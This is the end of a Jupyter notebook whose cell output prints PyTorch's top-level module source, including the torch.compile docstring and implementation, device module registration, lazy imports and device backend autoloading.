      "    Concretely, for every frame executed within the compiled region, we will attempt\n",
      "    to compile it and cache the compiled result on the code object for future\n",
      "    use.  A single frame may be compiled multiple times if previous compiled\n",
      "    results are not applicable for subsequent calls (this is called a \"guard\n",
      "    failure), you can use TORCH_LOGS=guards to debug these situations.\n",
      "    Multiple compiled results can be associated with a frame up to\n",
      "    ``torch._dynamo.config.cache_size_limit``, which defaults to 8; at which\n",
      "    point we will fall back to eager.  Note that compile caches are per\n",
      "    *code object*, not frame; if you dynamically create multiple copies of a\n",
      "    function, they will all share the same code cache.\n",
      "\n",
      "    Args:\n",
      "       model (Callable): Module/function to optimize\n",
      "       fullgraph (bool): If False (default), torch.compile attempts to discover compileable regions\n",
      "        in the function that it will optimize. If True, then we require that the entire function be\n",
      "        capturable into a single graph. If this is not possible (that is, if there are graph breaks),\n",
      "        then this will raise an error.\n",
      "       dynamic (bool or None): Use dynamic shape tracing.  When this is True, we will up-front attempt\n",
      "        to generate a kernel that is as dynamic as possible to avoid recompilations when\n",
      "        sizes change.  This may not always work as some operations/optimizations will\n",
      "        force specialization; use TORCH_LOGS=dynamic to debug overspecialization.\n",
      "        When this is False, we will NEVER generate dynamic kernels, we will always specialize.\n",
      "        By default (None), we automatically detect if dynamism has occurred and compile a more\n",
      "        dynamic kernel upon recompile.\n",
      "       backend (str or Callable): backend to be used\n",
      "\n",
      "        - \"inductor\" is the default backend, which is a good balance between performance and overhead\n",
      "\n",
      "        - Non experimental in-tree backends can be seen with `torch._dynamo.list_backends()`\n",
      "\n",
      "        - Experimental or debug in-tree backends can be seen with `torch._dynamo.list_backends(None)`\n",
      "\n",
      "        - To register an out-of-tree custom backend:\n",
      "          https://pytorch.org/docs/main/torch.compiler_custom_backends.html#registering-custom-backends\n",
      "       mode (str): Can be either \"default\", \"reduce-overhead\", \"max-autotune\" or \"max-autotune-no-cudagraphs\"\n",
      "\n",
      "        - \"default\" is the default mode, which is a good balance between performance and overhead\n",
      "\n",
      "        - \"reduce-overhead\" is a mode that reduces the overhead of python with CUDA graphs,\n",
      "          useful for small batches.  Reduction of overhead can come at the cost of more memory\n",
      "          usage, as we will cache the workspace memory required for the invocation so that we\n",
      "          do not have to reallocate it on subsequent runs.  Reduction of overhead is not guaranteed\n",
      "          to work; today, we only reduce overhead for CUDA only graphs which do not mutate inputs.\n",
      "          There are other circumstances where CUDA graphs are not applicable; use TORCH_LOG=perf_hints\n",
      "          to debug.\n",
      "\n",
      "        - \"max-autotune\" is a mode that leverages Triton or template based matrix multiplications\n",
      "          on supported devices and Triton based convolutions on GPU.\n",
      "          It enables CUDA graphs by default on GPU.\n",
      "\n",
      "        - \"max-autotune-no-cudagraphs\" is a mode similar to \"max-autotune\" but without CUDA graphs\n",
      "\n",
      "        - To see the exact configs that each mode sets you can call `torch._inductor.list_mode_options()`\n",
      "\n",
      "       options (dict): A dictionary of options to pass to the backend. Some notable ones to try out are\n",
      "\n",
      "        - `epilogue_fusion` which fuses pointwise ops into templates. Requires `max_autotune` to also be set\n",
      "\n",
      "        - `max_autotune` which will profile to pick the best matmul configuration\n",
      "\n",
      "        - `fallback_random` which is useful when debugging accuracy issues\n",
      "\n",
      "        - `shape_padding` which pads matrix shapes to better align loads on GPUs especially for tensor cores\n",
      "\n",
      "        - `triton.cudagraphs` which will reduce the overhead of python with CUDA graphs\n",
      "\n",
      "        - `trace.enabled` which is the most useful debugging flag to turn on\n",
      "\n",
      "        - `trace.graph_diagram` which will show you a picture of your graph after fusion\n",
      "\n",
      "        - For inductor you can see the full list of configs that it supports by calling `torch._inductor.list_options()`\n",
      "       disable (bool): Turn torch.compile() into a no-op for testing\n",
      "\n",
      "    Example::\n",
      "\n",
      "        @torch.compile(options={\"triton.cudagraphs\": True}, fullgraph=True)\n",
      "        def foo(x):\n",
      "            return torch.sin(x) + torch.cos(x)\n",
      "\n",
      "    \"\"\"\n",
      "    import sysconfig\n",
      "\n",
      "    _C._log_api_usage_once(\"torch.compile\")\n",
      "    if sys.version_info >= (3, 14):\n",
      "        raise RuntimeError(\"torch.compile is not supported on Python 3.14+\")\n",
      "    elif sysconfig.get_config_var(\"Py_GIL_DISABLED\") == 1:\n",
      "        raise RuntimeError(\n",
      "            \"torch.compile is not supported on Python built with GIL disabled\"\n",
      "        )\n",
      "\n",
      "    # Decorator mode\n",
      "    if model is None:\n",
      "\n",
      "        def fn(model: _Callable[_InputT, _RetT]) -> _Callable[_InputT, _RetT]:\n",
      "            if model is None:\n",
      "                raise RuntimeError(\"Model can't be None\")\n",
      "            return compile(\n",
      "                model,\n",
      "                fullgraph=fullgraph,\n",
      "                dynamic=dynamic,\n",
      "                backend=backend,\n",
      "                mode=mode,\n",
      "                options=options,\n",
      "                disable=disable,\n",
      "            )\n",
      "\n",
      "        return fn\n",
      "\n",
      "    if mode is not None and options is not None:\n",
      "        raise RuntimeError(\n",
      "            \"Either mode or options can be specified, but both can't be specified at the same time.\"\n",
      "        )\n",
      "    if mode is None and options is None:\n",
      "        mode = \"default\"\n",
      "\n",
      "    from torch._inductor.compiler_bisector import CompilerBisector\n",
      "\n",
      "    if bisect_backend := CompilerBisector.get_backend():\n",
      "        backend = bisect_backend\n",
      "\n",
      "    if backend == \"inductor\":\n",
      "        backend = _TorchCompileInductorWrapper(mode, options, dynamic)\n",
      "    else:\n",
      "        backend = _TorchCompileWrapper(backend, mode, options, dynamic)\n",
      "\n",
      "    return torch._dynamo.optimize(\n",
      "        backend=backend,\n",
      "        nopython=fullgraph,\n",
      "        dynamic=dynamic,\n",
      "        disable=disable,\n",
      "    )(model)  # type: ignore[return-value]\n",
      "\n",
      "\n",
      "def _register_device_module(device_type, module):\n",
      "    r\"\"\"Register an external runtime module of the specific :attr:`device_type`\n",
      "    supported by torch.\n",
      "\n",
      "    After the :attr:`module` is registered correctly, the user can refer\n",
      "    the external runtime module as part of torch with attribute torch.xxx.\n",
      "    \"\"\"\n",
      "    # Make sure the device_type represent a supported device type for torch.\n",
      "    device_type = torch.device(device_type).type\n",
      "    m = sys.modules[__name__]\n",
      "    if hasattr(m, device_type):\n",
      "        raise RuntimeError(\n",
      "            f\"The runtime module of '{device_type}' has already \"\n",
      "            f\"been registered with '{getattr(m, device_type)}'\"\n",
      "        )\n",
      "    setattr(m, device_type, module)\n",
      "    torch_module_name = \".\".join([__name__, device_type])\n",
      "    sys.modules[torch_module_name] = module\n",
      "\n",
      "\n",
      "from torch import (\n",
      "    export as export,\n",
      "    func as func,\n",
      "    library as library,\n",
      "    return_types as return_types,\n",
      ")\n",
      "from torch._higher_order_ops import cond as cond, while_loop as while_loop\n",
      "from torch.func import vmap as vmap\n",
      "\n",
      "\n",
      "if not TYPE_CHECKING:\n",
      "    from torch import _meta_registrations\n",
      "\n",
      "# Enable CUDA Sanitizer\n",
      "if \"TORCH_CUDA_SANITIZER\" in os.environ:\n",
      "    import torch.cuda._sanitizer as csan\n",
      "\n",
      "    csan.enable_cuda_sanitizer()\n",
      "\n",
      "# Populate magic methods on SymInt and SymFloat\n",
      "import torch.fx.experimental.sym_node\n",
      "from torch import fx as fx\n",
      "\n",
      "\n",
      "# Register MPS specific decomps\n",
      "torch.backends.mps._init()\n",
      "\n",
      "if not _running_with_deploy():\n",
      "    from torch import compiler as compiler\n",
      "\n",
      "    class _TritonLibrary:\n",
      "        lib = torch.library.Library(\"triton\", \"DEF\")\n",
      "        ops_table: _Dict[_Tuple[str, str], _Callable] = {}\n",
      "\n",
      "        @classmethod\n",
      "        def registerOp(cls, op_key, full_schema, op_impl, dispatch_key):\n",
      "            if (op_key, dispatch_key) not in cls.ops_table:\n",
      "                cls.lib.define(full_schema)\n",
      "                cls.lib.impl(\"triton::\" + op_key, op_impl, dispatch_key)\n",
      "                cls.ops_table[(op_key, dispatch_key)] = op_impl\n",
      "\n",
      "            return cls.ops_table[(op_key, dispatch_key)]\n",
      "\n",
      "\n",
      "# Deprecated attributes\n",
      "_deprecated_attrs = {\n",
      "    \"has_mps\": torch.backends.mps.is_built,\n",
      "    \"has_cuda\": torch.backends.cuda.is_built,\n",
      "    \"has_cudnn\": torch.backends.cudnn.is_available,\n",
      "    \"has_mkldnn\": torch.backends.mkldnn.is_available,\n",
      "}\n",
      "\n",
      "if TYPE_CHECKING:\n",
      "    # Import the following modules during type checking to enable code intelligence features,\n",
      "    # such as auto-completion in tools like pylance, even when these modules are not explicitly\n",
      "    # imported in user code.\n",
      "    from torch import (\n",
      "        _dynamo as _dynamo,\n",
      "        _inductor as _inductor,\n",
      "        _subclasses as _subclasses,\n",
      "        onnx as onnx,\n",
      "    )\n",
      "\n",
      "else:\n",
      "    _lazy_modules = {\n",
      "        \"_dynamo\",\n",
      "        \"_inductor\",\n",
      "        \"_export\",\n",
      "        # ONNX must be imported after _dynamo, _ops, _subclasses, fx, func and jit\n",
      "        \"onnx\",\n",
      "    }\n",
      "\n",
      "    def __getattr__(name):\n",
      "        # Deprecated attrs\n",
      "        replacement = _deprecated_attrs.get(name)\n",
      "        if replacement is not None:\n",
      "            import warnings\n",
      "\n",
      "            warnings.warn(\n",
      "                f\"'{name}' is deprecated, please use '{replacement.__module__}.{replacement.__name__}()'\",\n",
      "                stacklevel=2,\n",
      "            )\n",
      "            return replacement()\n",
      "\n",
      "        # Lazy modules\n",
      "        if name in _lazy_modules:\n",
      "            return importlib.import_module(f\".{name}\", __name__)\n",
      "\n",
      "        raise AttributeError(f\"module '{__name__}' has no attribute '{name}'\")\n",
      "\n",
      "\n",
      "def get_device_module(device: _Optional[_Union[torch.device, str]] = None):\n",
      "    \"\"\"\n",
      "    Returns the module associated with a given device(e.g., torch.device('cuda'), \"mtia:0\", \"xpu\", ...).\n",
      "    If no device is given, return the module for the current accelerator or CPU if none is present.\n",
      "    \"\"\"\n",
      "    if isinstance(device, torch.device):\n",
      "        device_module_name = device.type\n",
      "    elif isinstance(device, str):\n",
      "        device_module_name = torch.device(device).type\n",
      "    elif device is None:\n",
      "        # Using default accelerator type. If no accelerator is available, it automatically returns CPU device.\n",
      "        device_module_name = torch._C._get_accelerator().type\n",
      "    else:\n",
      "        raise RuntimeError(\n",
      "            f\"Invalid value of device '{device}', expect torch.device, str, or None\"\n",
      "        )\n",
      "    device_module = getattr(torch, device_module_name, None)\n",
      "    if device_module is None:\n",
      "        raise RuntimeError(\n",
      "            f\"Device '{device_module_name}' does not have a corresponding module registered as 'torch.{device_module_name}'.\"\n",
      "        )\n",
      "    return device_module\n",
      "\n",
      "\n",
      "def _constrain_as_size(\n",
      "    symbol,\n",
      "    min: _Optional[builtins.int] = None,\n",
      "    max: _Optional[builtins.int] = None,\n",
      "):\n",
      "    \"\"\"\n",
      "    This indicates that a given int is size-like, and can be used in any context where a size is expected.\n",
      "    You will typically use this when reading out integers from Tensors, e.g., max.item() or lengths.tolist()\n",
      "    which then need to be used as tensor constructors. Providing these assertions to PyTorch can help resolve\n",
      "      GuardOnDataDependentSymNode errors upon export, since we cannot guard on unbacked SymInts.\n",
      "\n",
      "    This function has unusual semantics in some circumstances in framework\n",
      "    code, we will treat this int as >= 2 (when we do a size-oblivious guard).\n",
      "    This makes it easier to use the unbacked int in size contexts,\n",
      "    as we will often attempt to guard on a size being zero/one\n",
      "    (e.g., when computing the contiguity of a tensor, or testing if\n",
      "    broadcasting can occur), which will not work on unbacked SymInts.\n",
      "    However, if we conservatively assume that the size is not zero/one, we will\n",
      "    end up with a graph that will still work even if the size is zero/one.\n",
      "\n",
      "    For more details, see https://docs.google.com/document/d/1HSuTTVvYH1pTew89Rtpeu84Ht3nQEFTYhAX3Ypa_xJs/edit\n",
      "    ```\n",
      "    \"\"\"\n",
      "    torch.sym_constrain_range_for_size(symbol, min=min, max=max)\n",
      "\n",
      "\n",
      "from torch import _logging\n",
      "\n",
      "\n",
      "_logging._init_logs()\n",
      "\n",
      "\n",
      "def _import_device_backends():\n",
      "    \"\"\"\n",
      "    Leverage the Python plugin mechanism to load out-of-the-tree device extensions.\n",
      "    See this RFC: https://github.com/pytorch/pytorch/issues/122468\n",
      "    \"\"\"\n",
      "    from importlib.metadata import entry_points\n",
      "\n",
      "    group_name = \"torch.backends\"\n",
      "    if sys.version_info < (3, 10):\n",
      "        backend_extensions = entry_points().get(group_name, ())\n",
      "    else:\n",
      "        backend_extensions = entry_points(group=group_name)\n",
      "\n",
      "    for backend_extension in backend_extensions:\n",
      "        try:\n",
      "            # Load the extension\n",
      "            entrypoint = backend_extension.load()\n",
      "            # Call the entrypoint\n",
      "            entrypoint()\n",
      "        except Exception as err:\n",
      "            raise RuntimeError(\n",
      "                f\"Failed to load the backend extension: {backend_extension.name}. \"\n",
      "                f\"You can disable extension auto-loading with TORCH_DEVICE_BACKEND_AUTOLOAD=0.\"\n",
      "            ) from err\n",
      "\n",
      "\n",
      "def _is_device_backend_autoload_enabled() -> builtins.bool:\n",
      "    \"\"\"\n",
      "    Whether autoloading out-of-the-tree device extensions is enabled.\n",
      "    The switch depends on the value of the environment variable\n",
      "    `TORCH_DEVICE_BACKEND_AUTOLOAD`.\n",
      "\n",
      "    Returns:\n",
      "        bool: Whether to enable autoloading the extensions. Enabled by default.\n",
      "\n",
      "    Examples:\n",
      "        >>> torch._is_device_backend_autoload_enabled()\n",
      "        True\n",
      "    \"\"\"\n",
      "    # enabled by default\n",
      "    return os.getenv(\"TORCH_DEVICE_BACKEND_AUTOLOAD\", \"1\") == \"1\"\n",
      "\n",
      "\n",
      "if _is_device_backend_autoload_enabled():\n",
      "    _import_device_backends()\n",
      "\n",
      "\n",
      "def _as_tensor_fullprec(t):\n",
      "    \"\"\"\n",
      "    Like torch.as_tensor, but when given Python data types it will keep\n",
      "    them in full precision.  Used for calling convention for Dynamo.\n",
      "    \"\"\"\n",
      "    ty = type(t)\n",
      "    if ty is builtins.float:\n",
      "        return torch.as_tensor(t, dtype=torch.float64)\n",
      "    elif ty is builtins.int:\n",
      "        return torch.as_tensor(t, dtype=torch.int64)\n",
      "    else:\n",
      "        return torch.as_tensor(t)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import inspect\n",
    "print(inspect.getsource(torch))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "wmdp_replication_v2",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
